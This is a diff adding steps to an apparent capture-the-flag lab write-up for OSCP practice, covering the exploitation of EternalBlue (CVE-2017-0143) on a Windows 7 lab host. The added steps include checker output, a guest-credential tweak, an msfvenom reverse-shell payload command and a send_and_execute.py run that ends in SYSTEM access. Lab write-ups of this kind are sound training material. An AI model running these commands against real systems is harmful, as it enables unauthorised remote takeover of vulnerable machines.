@@ -90,6 +90,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Right away, we see some interesting information:
 
 - SMB is enabled
+- `guest` account is enabled
 - OS is Windows 7
 - Potential username: `haris`
 
@@ -145,5 +146,61 @@ Read data files from: /usr/bin/../share/nmap
 ```
 
 And we see that nmap is reporting this box as vulnerable to CVE-2017-0143, aka EternalBlue.
+
+I was able to get a shell easily with Metasploit, although since I am prepping for the OSCP I will exploit this without Metasploit.
+
+After messing around with some pocs, I came across [this repo](https://github.com/helviojunior/MS17-010/) which is a fork of one of the more popular [repos](https://github.com/worawit/MS17-010).
+
+First, I test with `checker.py` and see denied access for the commonly used named pipes which this exploit uses:
+```
+$ python2 checker.py 10.129.76.113                                                                 1 ⨯
+Target OS: Windows 7 Professional 7601 Service Pack 1
+The target is not patched
+
+=== Testing named pipes ===
+spoolss: STATUS_ACCESS_DENIED
+samr: STATUS_ACCESS_DENIED
+netlogon: STATUS_ACCESS_DENIED
+lsarpc: STATUS_ACCESS_DENIED
+browser: STATUS_ACCESS_DENIED
+```
+
+Since we know guest authentication is enabled from our nmap scan, I'll try setting the `USERNAME` variable in this script from `''` to `guest`.
+
+![fc3a24ab76bc28fd3e7a63a3e287de11.png](../_resources/fc3a24ab76bc28fd3e7a63a3e287de11.png)
+
+And run it again...
+
+```
+$ python2 checker.py 10.129.76.113
+Target OS: Windows 7 Professional 7601 Service Pack 1
+The target is not patched
+
+=== Testing named pipes ===
+spoolss: STATUS_OBJECT_NAME_NOT_FOUND
+samr: Ok (64 bit)
+netlogon: Ok (Bind context 1 rejected: provider_rejection; abstract_syntax_not_supported (this usually means the interface isn't listening on the given endpoint))
+lsarpc: Ok (64 bit)
+browser: STATUS_OBJECT_NAME_NOT_FOUND
+```
+
+And we get "Ok's" back for `samr`, `netlogon`, and `lsarpc` pipes. Now that we know this should be exploitable via named pipes as `guest`, we should also set var `USERNAME` to `guest` in `send_and_execute.py`
+
+![55c555e95912551fac410e7f0a04261b.png](../_resources/55c555e95912551fac410e7f0a04261b.png)
+
+Lastly, `send_and_execute.py` accepts an executable file as an argument to be used as a payload. We'll get this created with meterpreter using the following command:
+
+`msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=1337 -f exe > rshell.exe`
+
+Time to run the exploit!
+
+`python2 send_and_execute.py 10.129.76.113 rshell.exe 445 lsarpc`
+
+![2b5a68f8bf59eb1d9bb27c66ebff389a.png](../_resources/2b5a68f8bf59eb1d9bb27c66ebff389a.png)
+
+Annndddd just like that we are `NT AUTHORITY\SYSTEM`! We can collect our loot and move on to the next box :)
+
+
+![flags.png](../_resources/flags.png)
 
 
